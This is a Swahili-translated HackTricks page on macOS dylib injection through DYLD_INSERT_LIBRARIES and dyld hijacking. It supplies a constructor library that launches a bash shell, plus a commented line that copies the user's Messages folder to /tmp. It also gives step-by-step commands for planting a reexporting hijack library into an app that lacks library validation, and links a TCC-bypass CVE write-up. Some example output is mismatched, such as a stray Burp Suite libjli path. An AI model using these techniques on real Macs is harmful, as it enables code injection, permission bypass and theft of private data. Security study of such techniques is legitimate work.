# macOS Udukuzi wa Dyld & DYLD_INSERT_LIBRARIES

<details>

<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Mfano wa Msingi wa DYLD_INSERT_LIBRARIES

**Mfano wa maktaba ya kuingiza** ili kutekeleza kikao cha amri:
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
//system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```
Binaryi ya kushambulia:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
Uingizaji:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Mfano wa Dyld Hijacking

Binary inayolengwa na mdudu ni `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.

{% tabs %}
{% tab title="entitlements" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>
{% endtab %}

{% tab title="LC_RPATH" %}
{% code overflow="wrap" %}
```bash
# Check where are the @rpath locations
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib2 (offset 12)
```
{% endcode %}
{% endtab %}

{% tab title="@rpath" %}
{% code overflow="wrap" %}
```bash
# Check librareis loaded using @rapth and the used versions
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
name @rpath/lib.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
# Check the versions
```
{% endcode %}
{% endtab %}
{% endtabs %}

Kwa habari tulizopata hapo awali tunajua kwamba **haichunguzi saini ya maktaba zilizopakia** na inajaribu kupakia maktaba kutoka:

* `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
* `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

Hata hivyo, ya kwanza haipo:
```bash
pwd
/Applications/VulnDyld.app

find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```
Basi, niwezekanavyo kuiteka! Unda maktaba ambayo **inatekeleza nambari isiyojulikana na kuuza kazi sawa** kama maktaba halali kwa kuuza upya. Na kumbuka kuikusanya na toleo lililotarajiwa:

{% code title="lib.m" %}
```objectivec
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```
{% endcode %}

Icompile:

{% code overflow="wrap" %}
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```
{% endcode %}

Njia ya kuuza upya iliyoundwa katika maktaba ni ya kulinganisha na mzigo, hebu ibadilishe kwa njia ya moja kwa moja kwa njia ya maktaba ya kuuza upya:

{% code overflow="wrap" %}
```bash
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib

# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
{% endcode %}

Hatimaye nakili kwenye **eneo lililodukuliwa**:

{% code overflow="wrap" %}
```bash
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```
{% endcode %}

Na **tekeleza** faili ya binary na angalia **maktaba ilipakia**:

<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib imechukuliwa katika /Applications/VulnDyld.app/Contents/Resources/lib/binary
</strong>Matumizi: [...]
</code></pre>

{% hint style="info" %}
Maelezo mazuri kuhusu jinsi ya kutumia udhaifu huu kudhibiti ruhusa za kamera za telegram yanaweza kupatikana katika [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
{% endhint %}

## Kwa Kiwango Kubwa

Ikiwa unapanga kujaribu kuingiza maktaba katika faili za binary ambazo hazikutazamiwa, unaweza kuangalia ujumbe wa tukio ili kujua wakati maktaba inapakia ndani ya mchakato (katika kesi hii ondoa printf na utekelezaji wa `/bin/bash`).
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
